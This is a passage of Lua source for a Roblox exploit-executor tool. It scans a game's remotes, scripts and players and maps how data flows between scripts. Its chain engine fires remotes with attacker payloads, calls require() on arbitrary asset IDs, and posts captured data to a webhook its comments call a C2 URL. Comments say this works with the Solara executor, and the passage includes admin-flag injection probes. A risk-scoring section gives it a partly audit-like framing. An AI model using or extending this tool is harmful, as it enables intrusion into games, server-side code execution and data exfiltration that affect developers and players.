    if type(fn) == "function" then return fn end
    -- 3. Guarded direct lookup (catches injected-but-non-rawget globals)
    local ok, f = pcall(function() return _G[name] end)
    if ok and type(f) == "function" then return f end
    return nil
end
-- -----------------------------------------------------------------------------

-- HTTP Feedback state -- declared early so executeNode (line ~896) can see it
-- Methods (HTTP:post, HTTP:get, etc.) are added later but the table itself must exist here
local HTTP = {
    webhookUrl    = "",    -- user-configured outbound URL
    feedHistory   = {},    -- array of request/response records
    exfilData     = {},    -- captured data items for the file tree
    treeRefresh   = nil,   -- fn: rebuild the file tree UI
    detailRefresh = nil,   -- fn: update right-pane detail view
    selectedItem  = nil,   -- currently selected file in tree
}
local graphCanvas   = nil  -- ScrollingFrame
local graphPage     = nil  -- The S->S page frame (parent for floating panels)
local graphOverlay  = nil  -- Frame for wire drawing (above canvas children)
local ctxMenu       = nil  -- active context menu Frame or nil
local ctxNode       = nil  -- node the context menu belongs to
local selectedNode  = nil  -- currently selected node
local wiringFrom    = nil  -- node being wired from (output port clicked)
local traceLastPlaced = {}  -- stageId -> node, from the most recent trace
-- Forward declarations for service detail panel (defined later, used in closeCtx)
local ctxDetail          = nil
local closeServiceDetail = nil  -- assigned below when the function is defined

local NODE_W  = 130
local NODE_H  = 60
local PORT_R  = 6
local HDR_H   = 22
local SNAP    = 10

-- -- Live game scanners ------------------------------------------------------
-- All scans are client-visible only (a LocalScript cannot see ServerStorage
-- or ServerScriptService). That blind spot is intentional and accurate: it
-- mirrors exactly what an attacker's client could discover and reach.

-- Build a readable full path for an instance (e.g. ReplicatedStorage.Remotes.Buy)
local function instancePath(inst)
    local segments = {}
    local cur = inst
    while cur and cur ~= game do
        table.insert(segments, 1, cur.Name)
        cur = cur.Parent
    end
    return table.concat(segments, ".")
end

-- Generic class scan across client-visible containers.
local function scanForClasses(classNames)
    local roots = {}
    local function tryAdd(getter)
        local ok, svc = pcall(getter)
        if ok and svc then table.insert(roots, svc) end
    end
    tryAdd(function() return game:GetService("ReplicatedStorage") end)
    tryAdd(function() return game:GetService("ReplicatedFirst") end)
    tryAdd(function() return workspace end)
    local lp = game:GetService("Players").LocalPlayer
    if lp then
        local pg = lp:FindFirstChild("PlayerGui")
        if pg then table.insert(roots, pg) end
    end

    local found = {}
    local seen  = {}
    for _, root in ipairs(roots) do
        local ok, descendants = pcall(function() return root:GetDescendants() end)
        if ok then
            for _, inst in ipairs(descendants) do
                if classNames[inst.ClassName] and not seen[inst] then
                    seen[inst] = true
                    table.insert(found, {
                        n        = inst.Name,
                        path     = instancePath(inst),
                        inst     = inst,
                        cls      = inst.ClassName,
                        d        = inst.ClassName .. "  @  " .. instancePath(inst),
                    })
                end
            end
        end
    end
    return found
end

local function scanRemotes()
    return scanForClasses({ RemoteEvent = true, RemoteFunction = true })
end
local function scanBindables()
    return scanForClasses({ BindableEvent = true, BindableFunction = true })
end
local function scanModules()
    return scanForClasses({ ModuleScript = true })
end
local function scanPlayers()
    local out = {}
    local ok, players = pcall(function() return game:GetService("Players"):GetPlayers() end)
    if ok then
        for _, plr in ipairs(players) do
            table.insert(out, {
                n    = plr.Name,
                path = "Players." .. plr.Name,
                inst = plr,
                cls  = "Player",
                d    = "UserId " .. tostring(plr.UserId) .. "  @  Players." .. plr.Name,
            })
        end
    end
    return out
end

-- Returns the dynamic action list for a node type, or nil to use static actions.
local function dynamicActionsFor(typeId)
    if typeId == "REMOTE"   then return scanRemotes()   end
    if typeId == "BINDABLE" then return scanBindables() end
    return nil
end


-- -- Utility ----------------------------------------------------------------
local function mF(p,x,y,w,h,col,al,z)
    local f=Instance.new("Frame")
    f.Position=UDim2.fromOffset(x,y) f.Size=UDim2.fromOffset(w,h)
    f.BackgroundColor3=col f.BackgroundTransparency=al
    f.BorderSizePixel=0 f.ZIndex=z or 6 f.Parent=p return f
end
local function mL(p,x,y,w,h,txt,font,sz,col,xa,z)
    local l=Instance.new("TextLabel")
    l.Position=UDim2.fromOffset(x,y) l.Size=UDim2.fromOffset(w,h)
    l.BackgroundTransparency=1 l.Text=txt l.Font=font l.TextSize=sz
    l.TextColor3=col l.TextXAlignment=xa or Enum.TextXAlignment.Left
    l.TextYAlignment=Enum.TextYAlignment.Center l.TextWrapped=false
    l.TextTruncate=Enum.TextTruncate.AtEnd
    l.BorderSizePixel=0 l.ZIndex=z or 7 l.Parent=p return l
end
local function mBtn(p,x,y,w,h,col,al,z)
    local b=Instance.new("TextButton")
    b.Position=UDim2.fromOffset(x,y) b.Size=UDim2.fromOffset(w,h)
    b.BackgroundColor3=col b.BackgroundTransparency=al
    b.Text="" b.AutoButtonColor=false b.BorderSizePixel=0
    b.ZIndex=z or 7 b.Parent=p return b
end
local function mC(i,r) local c=Instance.new("UICorner") c.CornerRadius=UDim.new(0,r or 4) c.Parent=i end
local function mS(i,col,tr,th)
    local s=Instance.new("UIStroke") s.Color=col s.Transparency=tr
    s.Thickness=th or 1 s.ApplyStrokeMode=Enum.ApplyStrokeMode.Border s.Parent=i return s
end

-- Vertical gradient fill helper (top->bottom)
local function mGrad(inst, c1, c2, rot)
    local g = Instance.new("UIGradient")
    g.Color = ColorSequence.new(c1, c2)
    g.Rotation = rot or 90
    g.Parent = inst
    return g
end

-- Glow stroke: a second outer UIStroke with high transparency for a halo feel
local function mGlow(inst, col, trans, thick)
    local s = Instance.new("UIStroke")
    s.Color = col
    s.Transparency = trans
    s.Thickness = thick or 2
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = inst
    return s
end

-- Corner bracket: draws an L-shaped accent in one corner of a frame.
-- corner = "TL","TR","BL","BR"
local function mBracket(parent, corner, len, thick, col, trans, z)
    -- Horizontal arm
    local h = Instance.new("Frame")
    h.BackgroundColor3 = col h.BackgroundTransparency = trans
    h.BorderSizePixel = 0 h.ZIndex = z or 14
    h.Size = UDim2.new(0, len, 0, thick)
    if corner == "TL" then h.Position = UDim2.new(0,0,0,0)
    elseif corner == "TR" then h.Position = UDim2.new(1,-len,0,0)
    elseif corner == "BL" then h.Position = UDim2.new(0,0,1,-thick)
    else                       h.Position = UDim2.new(1,-len,1,-thick) end
    h.Parent = parent
    -- Vertical arm
    local v = Instance.new("Frame")
    v.BackgroundColor3 = col v.BackgroundTransparency = trans
    v.BorderSizePixel = 0 v.ZIndex = z or 14
    v.Size = UDim2.new(0, thick, 0, len)
    if corner == "TL" then v.Position = UDim2.new(0,0,0,0)
    elseif corner == "TR" then v.Position = UDim2.new(1,-thick,0,0)
    elseif corner == "BL" then v.Position = UDim2.new(0,0,1,-len)
    else                       v.Position = UDim2.new(1,-thick,1,-len) end
    v.Parent = parent
    return h, v
end

-- --- DEPENDENCY PATH TRACER ---------------------------------------------------
--
-- Attempts to map how data flows through the game's script environment by:
--   1. SOURCE SCAN  -- reads Script.Source for each visible script and searches
--                     for structural keywords (FireServer, PostAsync, etc.).
--                     Only works in Studio / Plugin / Test-play context.
--                     In a live published game Script.Source returns "".
--   2. NAME INFERENCE -- correlates remote/bindable names to script names using
--                     pattern matching and hierarchy proximity. Always works.
--
-- The auto-generated graph labels each wire with its evidence type so the user
-- always knows whether the connection was source-confirmed or inferred.

-- -- Keyword -> chain stage mapping --------------------------------------------
local TRACE_KW = {
    FireServer        = { s = "REMOTE",   d = "client->server fire"    },
    InvokeServer      = { s = "REMOTE",   d = "client->server invoke"  },
    FireAllClients    = { s = "REMOTE",   d = "server->client fire"    },
    FireClient        = { s = "REMOTE",   d = "server->client fire"    },
    OnServerEvent     = { s = "REMOTE",   d = "server handler"        },
    OnClientEvent     = { s = "REMOTE",   d = "client handler"        },
    OnServerInvoke    = { s = "REMOTE",   d = "server invoke handler" },
    BindableEvent     = { s = "BINDABLE", d = "local event ref"       },
    BindableFunction  = { s = "BINDABLE", d = "local func ref"        },
    PublishAsync      = { s = "SERVICE",  d = "cross-server publish"  },
    SubscribeAsync    = { s = "SERVICE",  d = "cross-server subscribe" },
    PostAsync         = { s = "HTTP",     d = "outbound POST"         },
    GetAsync          = { s = "HTTP",     d = "outbound GET"          },
    ["require"]       = { s = "REQUIRE",  d = "module load"           },
}

-- -- Additional script roots (client-visible) ----------------------------------
local SCRIPT_ROOTS_FNS = {
    function() return game:GetService("ReplicatedStorage") end,
    function() return game:GetService("ReplicatedFirst")   end,
    function() return workspace                            end,
    function()
        local lp = game:GetService("Players").LocalPlayer
        return lp and lp:FindFirstChild("PlayerGui")
    end,
    function()
        local lp = game:GetService("Players").LocalPlayer
        return lp and lp:FindFirstChild("PlayerScripts")
    end,
}

-- Try to read a script's source -- returns nil if unavailable (live game).
local function trySource(scriptInst)
    local ok, s = pcall(function() return scriptInst.Source end)
    return (ok and type(s) == "string" and #s > 4) and s or nil
end

-- Score how likely a script name matches a remote/bindable name (0-1).
local function nameScore(scriptName, remoteName)
    local sL = scriptName:lower()
    local rL = remoteName:lower()
    -- Strip common noise suffixes
    local rBase = rL:gsub("event$",""):gsub("remote$",""):gsub("function$","")
                    :gsub("rf$",""):gsub("re$","")
    if #rBase < 3 then rBase = rL end
    -- Direct substring containment
    if sL:find(rBase, 1, true) or rL:find(sL, 1, true) then return 0.80 end
    -- Shared 4-char prefix
    if #rBase >= 4 and sL:sub(1,4) == rBase:sub(1,4)   then return 0.50 end
    -- Partial overlap
    if #rBase >= 3 and sL:find(rBase:sub(1,3), 1, true) then return 0.30 end
    return 0
end

-- Hierarchy proximity score: scripts in the same folder as a remote score higher.
-- Uses pcall throughout since instances may be unparented or GC'd between
-- discovery and scoring -- any invalid property access returns 0 safely.
local function hierScore(scriptInst, remoteInst)
    if not scriptInst or not remoteInst then return 0 end
    local ok, result = pcall(function()
        local sp = scriptInst.Parent
        local rp = remoteInst.Parent
        if not sp or not rp then return 0 end
        if sp == rp then return 0.60 end
        -- Guard sp.Parent and rp.Parent individually before accessing
        local spP = sp.Parent
        local rpP = rp.Parent
        if sp == rpP or spP == rp then return 0.30 end
        return 0
    end)
    return (ok and result) or 0
end

-- Shared progress variable for the scan overlay label
local traceProgressMsg = ""

-- Main trace: runs async via task.spawn, calls onComplete({...}) when done.
local function runDependencyTrace(onProgress, onComplete)

    onProgress("Collecting script instances...")
    task.wait(0.06)

    -- Collect all visible scripts
    local allScripts = {}
    local seen = {}
    for _, fn in ipairs(SCRIPT_ROOTS_FNS) do
        local ok, root = pcall(fn)
        if ok and root then
            local ok2, descs = pcall(function() return root:GetDescendants() end)
            if ok2 then
                for _, inst in ipairs(descs) do
                    if (inst.ClassName == "Script" or
                        inst.ClassName == "LocalScript" or
                        inst.ClassName == "ModuleScript") and not seen[inst] then
                        seen[inst] = true
                        table.insert(allScripts, inst)
                    end
                end
            end
        end
    end

    onProgress("Scanning " .. #allScripts .. " scripts for keywords...")
    task.wait(0.06)

    -- Scan each script
    local scriptData  = {}
    local sourceMode  = false   -- true = at least one script had readable source

    for _, sc in ipairs(allScripts) do
        local ok2 = pcall(function()
            local scSrc   = trySource(sc)
            if scSrc then sourceMode = true end

            local kwFound = {}
            local stages  = {}
            if scSrc then
                for kw, info in pairs(TRACE_KW) do
                    if scSrc:find(kw, 1, true) then
                        kwFound[kw] = info
                        stages[info.s] = true
                    end
                end
            end

            table.insert(scriptData, {
                inst     = sc,
                name     = sc.Name,
                path     = instancePath(sc),
                cls      = sc.ClassName,
                src      = scSrc,
                keywords = kwFound,
                stages   = stages,
            })
        end)
        -- invalid/unparented instances are silently skipped
    end

    onProgress("Mapping remote connections...")
    task.wait(0.06)

    local remotes   = scanRemotes()
    local bindables = scanBindables()

    -- Build connections: each entry describes a discovered link
    local connections = {}
    local stageEvidence = {}   -- which S2S stages are evidenced

    -- Pass 1: source-confirmed connections
    for _, sd in ipairs(scriptData) do
        for kw, info in pairs(sd.keywords) do
            stageEvidence[info.s] = true
            if info.s == "REMOTE" then
                -- Try to match to a specific remote by name + hierarchy
                for _, rem in ipairs(remotes) do
                    local ns = nameScore(sd.name, rem.n)
                    local hs = hierScore(sd.inst, rem.inst)
                    local conf = math.max(ns, hs) * 0.90   -- source-confirmed boost
                    if conf > 0.25 then
                        table.insert(connections, {
                            remoteInst = rem.inst,
                            remoteName = rem.n,
                            remotePath = rem.path,
                            remoteCls  = rem.cls,
                            scriptName = sd.name,
                            scriptPath = sd.path,
                            scriptCls  = sd.cls,
                            keyword    = kw,
                            direction  = info.d,
                            confidence = math.min(conf, 0.99),
                            evidence   = "source keyword: " .. kw,
                        })
                    end
                end
            elseif info.s == "BINDABLE" then
                for _, b in ipairs(bindables) do
                    local conf = nameScore(sd.name, b.n) * 0.85
                    if conf > 0.25 then
                        table.insert(connections, {
                            remoteInst = b.inst,
                            remoteName = b.n,
                            remotePath = b.path,
                            remoteCls  = b.cls,
                            scriptName = sd.name,
                            scriptPath = sd.path,
                            scriptCls  = sd.cls,
                            keyword    = kw,
                            direction  = info.d,
                            confidence = conf,
                            evidence   = "source keyword: " .. kw,
                        })
                    end
                end
            end
        end
    end

    -- Pass 2: name+hierarchy inference (scripts without readable source)
    for _, sd in ipairs(scriptData) do
        if not sd.src then
            for _, rem in ipairs(remotes) do
                local ns   = nameScore(sd.name, rem.n)
                local hs   = hierScore(sd.inst, rem.inst)
                local conf = math.max(ns + hs * 0.4, 0)
                if conf >= 0.55 then
                    -- Only add if no source-confirmed entry for same pair exists
                    local dup = false
                    for _, c in ipairs(connections) do
                        if c.remoteName == rem.n and c.scriptName == sd.name then
                            dup = true; break
                        end
                    end
                    if not dup then
                        stageEvidence["REMOTE"] = true
                        table.insert(connections, {
                            remoteInst = rem.inst,
                            remoteName = rem.n,
                            remotePath = rem.path,
                            remoteCls  = rem.cls,
                            scriptName = sd.name,
                            scriptPath = sd.path,
                            scriptCls  = sd.cls,
                            keyword    = "inferred",
                            direction  = "inferred",
                            confidence = conf * 0.65,   -- inference penalty
                            evidence   = "name/hierarchy inference",
                        })
                    end
                end
            end
        end
    end

    -- Sort connections by confidence descending
    table.sort(connections, function(a,b) return a.confidence > b.confidence end)

    -- -- HPDC-specific evidence: scan for reflection / DataStore patterns --
    local hpdcEvidence = {
        hasDataStore  = false,
        hasInstanceNew= false,
        hasReflection = false,
        hasAdminCheck = false,
    }
    for _, sd in ipairs(scriptData) do
        if sd.src then
            if sd.src:find("DataStoreService", 1, true) or sd.src:find("ProfileService", 1, true) then
                hpdcEvidence.hasDataStore   = true
                stageEvidence["INTERSERVICE"] = true
            end
            if sd.src:find("Instance.new", 1, true) then
                hpdcEvidence.hasInstanceNew = true
                stageEvidence["REFLECT"]    = true
            end
            if sd.src:find("SetAttribute", 1, true) or sd.src:find("GetAttribute", 1, true) then
                hpdcEvidence.hasReflection  = true
                stageEvidence["REFLECT"]    = true
            end
            if sd.src:find("isAdmin", 1, true) or sd.src:find("IsAdmin", 1, true)
            or sd.src:find("isDeveloper", 1, true) then
                hpdcEvidence.hasAdminCheck  = true
                stageEvidence["LRCE"]       = true
            end
        end
    end

    onProgress("Building graph...")
    task.wait(0.06)

    onComplete({
        scripts      = scriptData,
        remotes      = remotes,
        bindables    = bindables,
        connections  = connections,
        stagePresent = stageEvidence,
        sourceMode   = sourceMode,
        scriptCount  = #allScripts,
        hpdcEvidence = hpdcEvidence,
    })
end

-- -- Wire confidence colour ----------------------------------------------------
-- Green = high (source confirmed), Amber = medium (partial), Red = low (guess)
local function confidenceColour(conf)
    if conf >= 0.70 then return GC.CHK,  0.08 end   -- green, bright
    if conf >= 0.45 then return GC.WARN, 0.15 end   -- amber
    return                        GC.ERR,  0.30       -- red, faint
end

-- -- Auto-graph builder --------------------------------------------------------
-- -- Wire confidence colour ----------------------------------------------------
-- Green = high (source confirmed), Amber = medium (partial), Red = low (guess)
local function confidenceColour(conf)
    if conf >= 0.70 then return GC.CHK,  0.08 end   -- green, bright
    if conf >= 0.45 then return GC.WARN, 0.15 end   -- amber
    return                        GC.ERR,  0.30       -- red, faint
end

-- -- Auto-graph builder --------------------------------------------------------

-- -- Chain execution engine --------------------------------------------------
-- Walks the wired graph from each source in topological order, executing the
-- real call at each node and threading each node's output into the next node's
-- input. Stops a path the moment it hits a secured node (control enforced).
--
-- Returns a log: array of { node, status, detail } in execution order.

local HttpService = game:GetService("HttpService")

-- Execute a single node's real action given an incoming payload.
-- Returns ok(boolean), output(any), detail(string).
local function executeNode(node, payload)
    local id = node.typeData.id

    if id == "INPUT" then
        -- Source node: emits the user-typed payload as the chain seed.
        local p = node.inputValue or ""
        return true, p, "emitted payload (" .. tostring(#p) .. " chars)"

    elseif id == "REMOTE" then
        local target = node.targetInst
        if not target then return false, nil, "no remote selected" end
        local ok, err = pcall(function()
            if target.ClassName == "RemoteEvent" then
                target:FireServer(payload)
            elseif target.ClassName == "RemoteFunction" then
                return target:InvokeServer(payload)
            end
        end)
        if ok then return true, payload, "fired " .. target.ClassName .. " -> " .. instancePath(target)
        else return false, nil, "error: " .. tostring(err) end

    elseif id == "BINDABLE" then
        local target = node.targetInst
        if not target then return false, nil, "no bindable selected" end
        local ok, res = pcall(function()
            if target.ClassName == "BindableEvent" then
                target:Fire(payload)
                return payload
            elseif target.ClassName == "BindableFunction" then
                return target:Invoke(payload)
            end
        end)
        if ok then return true, res, "dispatched " .. target.ClassName
        else return false, nil, "error: " .. tostring(res) end

    elseif id == "SERVICE" then
        local sname = node.selectedAction and node.selectedAction.n or nil
        if not sname then return false, nil, "no service selected" end
        local ok, svc = pcall(function() return game:GetService(sname) end)
        if ok and svc then return true, payload, "resolved service " .. sname
        else return false, nil, "could not resolve " .. tostring(sname) end

    elseif id == "REQUIRE" then
        local assetText = node.inputValue or ""
        local assetId = tonumber(assetText)
        if not assetId then return false, nil, "invalid AssetID: '" .. assetText .. "'" end
        local ok, result = pcall(function() return require(assetId) end)
        if ok then return true, result, "required asset " .. tostring(assetId)
        else return false, nil, "require failed: " .. tostring(result) end

    elseif id == "HTTP" then
        local url = node.inputValue or ""
        -- Fall back to the C2 outbound URL if the node has no URL set
        if url == "" then url = HTTP.webhookUrl or "" end
        if url == "" then return false, nil, "no URL provided" end

        local method = (node.selectedAction and node.selectedAction.n) or "GET Request"
        local isPost = method:find("POST") or method:find("Webhook") or method:find("REST")

        -- Reuse HTTP:post() / HTTP:get() -- already confirmed working with Solara
        -- These methods use executor request() with proper fallback chain.
        local ok, status, body, ms
        if isPost then
            ok, status, body, ms = HTTP:post(url, { data=payload, ts=tick() })
        else
            ok, status, body, ms = HTTP:get(url)
        end

        if ok then
            HTTP:capture("HTTP_REQUESTS", "chain_"..os.date("%H%M%S"), {
                method  = isPost and "POST" or "GET",
                url     = url,
                status  = status,
                ms      = ms,
                response= body,
            })
            return true, body,
                (isPost and "POST" or "GET").." ok ("..tostring(status)
                .." / "..tostring(ms).."ms): "..tostring(body):sub(1,60)
        else
            return false, nil,
                (isPost and "POST" or "GET").." error: "..tostring(body)
        end
    -- -- HPDC node handlers --------------------------------------------------
    elseif id == "INGRESS" then
        -- Ingress: fire through the selected network framework remote.
        -- Treat the same as REMOTE but labelled specifically for HPDC context.
        local target = node.targetInst
        if not target then
            -- No live instance -- simulate the ingress event and carry payload forward.
            local act = node.selectedAction and node.selectedAction.n or "unknown framework"
            return true, payload,
                "ingress via " .. act .. " (no live instance -- simulation mode)"
        end
        local ok, err = pcall(function()
            if target.ClassName == "RemoteEvent" then
                target:FireServer(payload)
            elseif target.ClassName == "RemoteFunction" then
                return target:InvokeServer(payload)
            end
        end)
        if ok then
            return true, payload,
                "ingress fired to " .. target.ClassName .. " " .. instancePath(target)
        else
            return false, nil, "ingress error: " .. tostring(err)
        end

    elseif id == "SERIAL" then
        -- Serializer: apply the selected deserialization pattern to the payload.
        local act = node.selectedAction and node.selectedAction.n or ""
        local ok, result = pcall(function()
            if act == "JSON Deserialization" then
                -- Attempt to decode the payload as JSON, exposing type coercion paths.
                if type(payload) == "string" then
                    return HttpService:JSONDecode(payload)
                end
                return payload
            elseif act == "Type Coercion Pattern" then
                -- Apply tonumber/tostring coercion -- exposes math.huge from "inf".
                local n = tonumber(payload)
                return n ~= nil and n or tostring(payload)
            else
                -- All other patterns: pass payload through as-is (trust the data).
                return payload
            end
        end)
        local out = ok and result or payload
        return true, out,
            "serialized via [" .. act .. "]"
            .. (ok and "" or " (error caught, payload passed through)")

    elseif id == "INTERSERVICE" then
        -- Lateral transport: write payload into a simulated session cache entry
        -- and return it, modelling the trust-inherited read by secondary systems.
        local act = node.selectedAction and node.selectedAction.n or "session cache"
        -- In a live game this would write to a real session table.
        -- Here we carry the payload forward with a provenance note stripped.
        local cached = payload  -- secondary systems see this as server-authoritative
        return true, cached,
            "written to [" .. act .. "] -- downstream reads this as validated"

    elseif id == "REFLECT" then
        -- Reflection sink: attempt the selected reflection operation with the payload.
        local act = node.selectedAction and node.selectedAction.n or ""
        local payStr = tostring(payload)
        local ok, result = pcall(function()
            if act == "Instance.new(cache string)" then
                -- Attempt to instantiate an object using the payload as the class name.
                local inst = Instance.new(payStr)
                inst:Destroy()  -- clean up immediately; the test is whether it succeeded
                return 'Instance.new("' .. payStr .. '") succeeded -- class is valid'
            elseif act == "Dynamic Property Setter" then
                -- Test whether a Folder accepts the payload string as an attribute key.
                local probe = Instance.new("Folder")
                probe:SetAttribute(payStr, true)
                local readBack = probe:GetAttribute(payStr)
                probe:Destroy()
                return 'SetAttribute("' .. payStr:sub(1,20) .. '", true) -- read back: '
                    .. tostring(readBack)
            elseif act == "JSONDecode Reflection" then
                -- Decode payload as JSON and inspect returned keys.
                if type(payload) == "string" then
                    local decoded = HttpService:JSONDecode(payload)
                    local keys = {}
                    for k in pairs(decoded) do table.insert(keys, k) end
                    return "decoded keys: {" .. table.concat(keys, ", ") .. "}"
                end
                return "payload is not a string -- reflection skipped"
            else
                -- Other reflection patterns: carry payload forward with notation.
                return "reflection via [" .. act .. "] -- payload: " .. payStr:sub(1,40)
            end
        end)
        if ok then
            return true, payload, "reflect: " .. tostring(result):sub(1,60)
        else
            -- Error IS the result -- server rejected the class name or key.
            return false, nil,
                "reflect rejected: " .. tostring(result):sub(1,60)
                .. " (server protected against this pattern)"
        end

    elseif id == "LRCE" then
        -- Logical execution: verify the authorisation state after the reflection sink.
        -- Checks whether the selected bypass condition can be observed in this session.
        local act = node.selectedAction and node.selectedAction.n or ""
        local ok, result = pcall(function()
            if act == "Admin Flag Injection" then
                -- Check whether the local player appears to hold admin in any cached table.
                local plr = game:GetService("Players").LocalPlayer
                return "player: " .. plr.Name
                    .. " | UserId: " .. plr.UserId
                    .. " | (admin state must be verified server-side)"
            elseif act == "Authorization Check Disable" then
                return "auth check state is server-side only -- "
                    .. "result depends on Step 4 attribute rewrite success"
            elseif act == "Persistent State Override" then
                -- Verify whether DataStoreService is accessible (pre-condition for persistence).
                local ok2, ds = pcall(function()
                    return game:GetService("DataStoreService")
                end)
                return ok2 and "DataStoreService accessible -- persistence path open"
                           or "DataStoreService not accessible in this context"
            else
                return "logical execution via [" .. act .. "] -- "
                    .. "outcome depends on server-side state from Steps 3-4"
            end
        end)
        if ok then
            return true, tostring(result), "LRCE: " .. tostring(result):sub(1,60)
        else
            return false, nil, "LRCE probe error: " .. tostring(result):sub(1,60)
        end
    end

    return false, nil, "unknown node type"
end


-- Compute absolute canvas position of a port given its node
local function getPortPos(node, isOut)
    local nx = node.frame.Position.X.Offset
    local ny = node.frame.Position.Y.Offset
    local portY = ny + NODE_H / 2
    if isOut then
        return Vector2.new(nx + NODE_W, portY)
    else
        return Vector2.new(nx, portY)
    end
end

-- Draw or update a wire frame between two canvas positions.
-- Wire is a 3px rotated bar with rounded ends (UICorner) for a cable feel.
local WIRE_TH = 3
local function drawWireLine(wireFrame, p1, p2)
    local dx = p2.X - p1.X
    local dy = p2.Y - p1.Y
    local length = math.sqrt(dx*dx + dy*dy)
    if length < 1 then length = 1 end
    local angle  = math.atan2(dy, dx)
    local midX   = (p1.X + p2.X) / 2
    local midY   = (p1.Y + p2.Y) / 2
    wireFrame.Size     = UDim2.fromOffset(length, WIRE_TH)
    wireFrame.Position = UDim2.fromOffset(midX - length/2, midY - WIRE_TH/2)
    wireFrame.Rotation = math.deg(angle)
end

-- Create a styled wire frame (rounded glowing cable) parented to the canvas.
local function makeWire()
    local wf = Instance.new("Frame")
    wf.Size = UDim2.fromOffset(WIRE_TH, WIRE_TH)
    wf.BackgroundColor3 = GC.WIRE
    wf.BackgroundTransparency = 0.30
    wf.BorderSizePixel = 0
    wf.ZIndex = 9
    wf.Parent = graphCanvas
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, WIRE_TH/2)  -- fully rounded ends
    c.Parent = wf
    local glow = Instance.new("UIStroke")
    glow.Color = GC.WIRE
    glow.Transparency = 0.70
    glow.Thickness = 2
    glow.Parent = wf
    return wf
end

-- -- Trust propagation ------------------------------------------------------
-- Computes which nodes are "hot" (reachable by un-secured attacker flow).
--
-- Model:
--   * A SOURCE is any node with no incoming wires (an entry point).
--   * "Hot" spreads from every source along outgoing wires.
--   * Propagation STOPS at any node whose control toggle is ON (secured):
--     that node absorbs the flow and does not pass hot downstream.
--   * A node is hot if attacker flow reaches it AND it is not itself secured.
--
-- Returns a set: hotSet[node] = true for every hot node.
local function computeHotSet()
    -- Build incoming-count + adjacency
    local incoming = {}
    local adj      = {}   -- adj[node] = { downstream nodes }
    for _, n in ipairs(graphNodes) do
        incoming[n] = 0
        adj[n]      = {}
    end
    for _, w in ipairs(graphWires) do
        if incoming[w.to] ~= nil then
            incoming[w.to] = incoming[w.to] + 1
            table.insert(adj[w.from], w.to)
        end
    end

    -- Seed queue with sources (no incoming wires)
    local hotSet = {}
    local queue  = {}
    for _, n in ipairs(graphNodes) do
        if incoming[n] == 0 then
            -- A source is hot only if it is not itself secured
            if not n.secured then
                hotSet[n] = true
                table.insert(queue, n)
            end
        end
    end

    -- BFS: spread hot along wires, blocked by secured nodes
    while #queue > 0 do
        local cur = table.remove(queue, 1)
        for _, nxt in ipairs(adj[cur]) do
            -- A secured node absorbs the flow: it never becomes hot,
            -- and nothing past it inherits hot *through* it.
            if not nxt.secured and not hotSet[nxt] then
                hotSet[nxt] = true
                table.insert(queue, nxt)
            end
        end
    end

    return hotSet
end


-- --- DATA-FLOW RISK SCORING ENGINE ------------------------------------------
-- Evaluates the configured chain graph and returns a risk score 0-100.
-- Tier: HIGH (>=70) | MEDIUM (35-69) | LOW (<35)
--
-- Scoring dimensions (additive, then clamped):
--   Entry risk    +30  if REMOTE node unsecured (untrusted payload enters)
--   Laundering    +20  if BINDABLE unsecured (provenance lost)
--   Amplification +20  if MessagingService unsecured (fleet broadcast)
--   Sink danger:
--     require(dynamic ID)   +35  arbitrary code execution
--     require(static ID)    +10  ownership risk only
--     HttpService(dynamic)  +28  exfiltration + C2 channel
--     HttpService(static)   +12  controlled egress
--     data processing only    0  no execution/egress sink
--   Critical path +15  if Remote->Bindable->require(dynamic) pattern detected
--   Fleet+exec    +10  if messaging broadcast reaches execution sink
--   Control relief  -8  per enforced control (capped at -40)

local function scoreChain()
    local order = topoSort and topoSort() or nil
    if not order or #order == 0 then
        return { score=0, tier="NONE", tierCol=GC.DIM, tierBg=Color3.fromRGB(20,22,35), reasons={}, breakdown={} }
    end

    local hotSet = computeHotSet()

    -- Per-node flags
    local remoteUnsecured   = false
    local bindableUnsecured = false
    local messagingUnsecured= false
    local requireDynamic    = false
    local requireStatic     = false
    local httpDynamic       = false
    local httpStatic        = false
    local hasExecutionSink  = false
    local hasEgressSink     = false
    local controlsCount     = 0

    local reasons   = {}
    local rawScore  = 0

    local function addReason(weight, text, sev)
        table.insert(reasons, { weight=weight, text=text, severity=sev })
        rawScore = rawScore + weight
    end

    for _, node in ipairs(order) do
        local id  = node.typeData.id
        local sec = node.secured

        if sec then controlsCount = controlsCount + 1 end

        if id == "INPUT" then
            local pv = (node.inputValue or ""):gsub("%s","")
            if pv ~= "" then
                addReason(0,
                    "Payload configured: \"" .. pv:sub(1,32) .. "\"",
                    "INFO")
            end

        elseif id == "REMOTE" then
            if not sec then
                remoteUnsecured = true
                addReason(30,
                    "RemoteEvent boundary unsecured -- client payload enters trust domain unvalidated.",
                    "HIGH")
            else
                addReason(-10,
                    "RemoteEvent: validation enforced at boundary. Payload sanitised on entry.",
                    "LOW")
            end

        elseif id == "BINDABLE" then
            if not sec then
                bindableUnsecured = true
                addReason(20,
                    "BindableEvent relays without provenance tag -- downstream cannot distinguish client origin.",
                    "HIGH")
            else
                addReason(-5,
                    "Bindable: provenance re-tagged. Downstream scripts know this came from client.",
                    "LOW")
            end

        elseif id == "SERVICE" then
            local act = node.selectedAction
            local svcName = act and act.n or ""
            if svcName == "MessagingService" then
                if not sec then
                    messagingUnsecured = true
                    addReason(20,
                        "MessagingService: unvalidated payload broadcast to every active server in the fleet.",
                        "HIGH")
                else
                    addReason(0,
                        "MessagingService: access authorised -- payload reviewed before broadcast.",
                        "LOW")
                end
            end

        elseif id == "REQUIRE" then
            hasExecutionSink = true
            local iv = (node.inputValue or ""):gsub("%s","")
            local isStaticNum = (iv ~= "" and tonumber(iv) ~= nil)
            if not sec then
                if isStaticNum then
                    requireStatic = true
                    addReason(10,
                        "require(" .. iv .. ") -- static AssetID, but verify you own/control this asset.",
                        "MEDIUM")
                else
                    requireDynamic = true
                    addReason(35,
                        "require() with dynamic/unset AssetID -- attacker-controlled ID = arbitrary server-side code execution.",
                        "CRITICAL")
                end
            else
                addReason(-15,
                    "require(): AssetID hard-allowlisted. Execution sink secured -- arbitrary IDs rejected.",
                    "LOW")
            end

        elseif id == "HTTP" then
            hasEgressSink = true
            local iv = (node.inputValue or ""):gsub("%s","")
            if not sec then
                if iv ~= "" and not iv:find("{") and iv:sub(1,4) == "http" then
                    httpStatic = true
                    addReason(12,
